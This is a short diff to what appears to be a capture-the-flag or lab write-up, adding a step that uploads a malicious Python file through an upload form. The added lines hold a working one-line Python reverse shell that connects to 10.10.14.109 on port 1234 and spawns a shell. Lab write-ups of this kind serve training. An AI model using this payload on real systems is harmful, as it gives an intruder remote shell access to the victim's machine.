@@ -91,5 +91,9 @@ ENTRYPOINT ["/bin/bash"]
 ```
 
 Lets handle the issue at hand right now..The Upload form, lets try uploading a malicious python file and see if we get revshell
+Payload:
 
+```python
+import os,pty,socket;s=socket.socket();s.connect(("10.10.14.109",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
+```
 
